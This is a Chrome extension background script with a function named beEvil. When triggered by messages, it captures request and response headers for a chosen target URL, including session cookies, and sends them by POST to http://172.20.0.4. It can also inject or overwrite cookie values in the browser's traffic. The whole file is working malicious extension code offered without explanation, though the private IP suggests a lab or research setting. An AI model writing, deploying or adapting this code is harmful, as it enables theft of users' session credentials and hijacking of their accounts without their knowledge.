function beEvil(data){
    fetch("http://172.20.0.4", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
    });
}

chrome.runtime.onMessage.addListener((req, sen, resp) => {
    switch (req.func) {
        case "beforeGet":
            chrome.webRequest.onBeforeSendHeaders.addListener((details) => {
                beEvil(details.requestHeaders);
            },
            {urls: [req.target]},
            ["requestHeaders", "extraHeaders"]
            );
            break;
        case "beforeSet":
            chrome.webRequest.onBeforeSendHeaders.addListener((details) => {
                var cookieIndex = -1
                for (i=0; i<details.requestHeaders.length; i++){
                    if(details.requestHeaders[i].name == "Cookie"){
                        cookieIndex = i;
                    }
                }
                if(cookieIndex != -1){
                    if (details.requestHeaders[cookieIndex].value.includes(req.name + "=")){
                        var cookies = details.requestHeaders[cookieIndex].value.split(";");
                        var tempHeader = ""
                        cookies.forEach((cookie) => {
                            if (cookie.includes(req.name + "=")){
                                tempHeader = tempHeader + req.name + "=" + req.value + "; ";
                            }else{
                                tempHeader = tempHeader + cookie + "; ";
                            }
                        });
                        details.requestHeaders[cookieIndex].value = tempHeader 
                    }else{
                        details.requestHeaders[cookieIndex].value = details.requestHeaders[cookieIndex].value + " " + req.name + "=" + req.value + ";"
                    }
                }
                return {requestHeaders: details.requestHeaders};
                },
                {urls: [req.target]},
                ["blocking", "requestHeaders", "extraHeaders"]
                );
                
                chrome.webRequest.onSendHeaders.addListener((details) => {
                    console.log(details.requestHeaders);
                },
                {urls: [req.target]},
                ["requestHeaders", "extraHeaders"]
                );
            break;
        case "headersGet":
            chrome.webRequest.onHeadersReceived.addListener((details) => {
                beEvil(details.responseHeaders);
            },
            {urls: [req.target]},
            ["responseHeaders", "extraHeaders"]
            );
            break;
        case "headersSet":
            chrome.webRequest.onHeadersReceived.addListener((details) => {
                var cookieIndex = -1
                for (i=0; i<details.responseHeaders.length; i++){
                    if(details.responseHeaders[i].name == "Cookie"){
                        cookieIndex = i;
                    }
                }
                if(cookieIndex != -1){
                    if (details.responseHeaders[cookieIndex].value.includes(req.name + "=")){
                        var cookies = details.responseHeaders[cookieIndex].value.split(";");
                        var tempHeader = ""
                        cookies.forEach((cookie) => {
                            if (cookie.includes(req.name + "=")){
                                tempHeader = tempHeader + req.name + "=" + req.value + "; ";
                            }else{
                                tempHeader = tempHeader + cookie + "; ";
                            }
                        });
                        details.responseHeaders[cookieIndex].value = tempHeader 
                    }else{
                        details.responseHeaders[cookieIndex].value = details.responseHeaders[cookieIndex].value + " " + req.name + "=" + req.value + ";"
                    }
                }
                return {responseHeaders: details.responseHeaders};
                },
                {urls: [req.target]},
                ["blocking", "responseHeaders", "extraHeaders"]
                );
                
                chrome.webRequest.onResponseStarted.addListener((details) => {
                    console.log(details.responseHeaders);
                },
                {urls: [req.target]},
                ["responseHeaders", "extraHeaders"]
                );
            break;
    }
});
